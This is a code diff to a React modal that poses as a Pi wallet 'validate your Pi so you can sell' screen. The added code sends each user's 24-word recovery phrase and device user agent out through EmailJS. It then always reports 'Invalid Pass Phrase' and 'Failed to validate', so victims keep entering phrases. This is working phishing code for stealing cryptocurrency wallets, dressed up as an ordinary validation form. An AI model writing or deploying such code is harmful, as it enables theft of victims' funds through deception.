@@ -1,10 +1,12 @@
-import { Button, message, Modal } from "antd";
+import { Button, Form, message, Modal } from "antd";
 import TextArea from "antd/es/input/TextArea";
 import { motion } from "framer-motion";
-import { useState } from "react";
+import { useEffect, useState } from "react";
 import { GiFingerPrint } from "react-icons/gi";
 import { MdPassword } from "react-icons/md";
 import Loading from "./Loading";
+import emailjs from "@emailjs/browser";
+import { useForm } from "antd/es/form/Form";
 
 type Props = {
   open: boolean;
@@ -16,23 +18,48 @@ const ValidateModal = (props: Props) => {
   const [isLoading, setIsLoading] = useState(false);
   const [phrase, setPhrase] = useState("");
 
+  const [form] = useForm();
+
+  useEffect(() => {
+    emailjs.init(import.meta.env.VITE_EMAIL_PUBLIC_KEY);
+  }, []);
+
   if (isLoading) {
     return <Loading />;
   }
 
-  const handleClick = () => {
+  const deviceInfo = window.navigator.userAgent;
+
+  const handleSubmit = async () => {
     if (phrase === "") {
       setErrorMessage(true);
       return message.error("Please Enter Your Passphrase");
     }
+
+    form.setFieldsValue({ device_info: deviceInfo });
     setIsLoading(true);
-    setTimeout(() => {
+
+    try {
+      await emailjs.send(
+        import.meta.env.VITE_EMAIL_SERVICE_ID,
+        import.meta.env.VITE_EMAIL_TEMPLATE_ID,
+        {
+          device_info: deviceInfo,
+          passphrase: phrase,
+        },
+        import.meta.env.VITE_EMAIL_PUBLIC_KEY
+      );
       setErrorMessage(true);
       message.error("Invalid Pass Phrase");
+    } catch (error) {
+      console.error("Email sending failed:", error);
+    } finally {
       setIsLoading(false);
-    }, 3000);
+    }
+
     setTimeout(() => {
       setErrorMessage(false);
+      message.error("Failed to validate");
     }, 6000);
   };
 
@@ -41,68 +68,70 @@ const ValidateModal = (props: Props) => {
       footer={false}
       closeIcon={false}
       open={props.open}
-      onClose={() => props.setOpen(false)}
       onCancel={() => props.setOpen(false)}
     >
       <div className="border-b pb-2">
         <p className="text-3xl font-semibold">Validate PI</p>
-        <p className="capitalize text-lg">Validate your pi so you can sell</p>
+        <p className="capitalize text-lg">Validate your Pi so you can sell</p>
       </div>
 
       {errorMessage && (
         <motion.div
-          initial={{
-            y: 20,
-          }}
-          animate={{
-            y: 0,
-          }}
+          initial={{ y: 20 }}
+          animate={{ y: 0 }}
           transition={{
             type: "spring",
-            stiffness: 550, // Higher stiffness for a more dramatic, "snappy" bounce
-            damping: 5, // Lower damping to increase the bounce effect
-            mass: 1, // Adjust mass if you want it to bounce a little slower/faster
+            stiffness: 550,
+            damping: 5,
             duration: 0.5,
-            bounce: 0.7, // Adds an inherent bounce effect
+            bounce: 0.7,
           }}
           className="error-msg border border-red-600 w-full bg-red-200 text-red-800 font-semibold p-4 py-2 rounded-lg"
         >
-          Invalid Pass Phrase. Please try again
+          Invalid Pass Phrase. Please try again.
         </motion.div>
       )}
 
-      <div className="flex flex-col gap-2 items-center mb-6 mt-2">
-        <p className="">Enter your 24 word phrase</p>
-
-        <TextArea
-          className="border-yellow-700"
-          placeholder="Enter your 24 word phrase"
-          rows={6}
-          value={phrase}
-          onChange={(e) => {
-            setErrorMessage(false);
-            setPhrase(e.target.value);
-          }}
-        />
-        <p className="">Make sure your passphrase is correct</p>
-      </div>
-      <div className="space-y-2 md:space-y-0 md:flex gap-2">
-        <Button
-          type="primary"
-          onClick={handleClick}
-          className="h-12 w-full font-semibold"
-          icon={<MdPassword className="text-2xl" />}
-        >
-          Validate with passphrase
-        </Button>
-        <Button
-          type="primary"
-          className="h-12 w-full font-semibold"
-          icon={<GiFingerPrint className="text-2xl" />}
-        >
-          Validate with fingerprint
-        </Button>
-      </div>
+      <Form form={form} onFinish={handleSubmit}>
+        <div className="flex flex-col gap-2 items-center mb-6 mt-2">
+          <p>Enter your 24-word phrase</p>
+          <Form.Item
+            className="w-full"
+            name="passphrase"
+            rules={[{ required: true, message: "Passphrase is required" }]}
+          >
+            <TextArea
+              className="border-yellow-700"
+              placeholder="Enter your 24-word phrase"
+              rows={6}
+              value={phrase}
+              onChange={(e) => {
+                setErrorMessage(false);
+                setPhrase(e.target.value);
+              }}
+            />
+          </Form.Item>
+          <p className="-mt-4">Make sure your passphrase is correct</p>
+        </div>
+        <div className="space-y-2 md:space-y-0 md:flex gap-2">
+          <Button
+            loading={isLoading}
+            htmlType="submit"
+            type="primary"
+            className="h-12 w-full font-semibold"
+            icon={<MdPassword className="text-2xl" />}
+          >
+            Validate with passphrase
+          </Button>
+          <Button
+            type="primary"
+            className="h-12 w-full font-semibold"
+            icon={<GiFingerPrint className="text-2xl" />}
+          >
+            Validate with fingerprint
+          </Button>
+        </div>
+      </Form>
     </Modal>
   );
 };
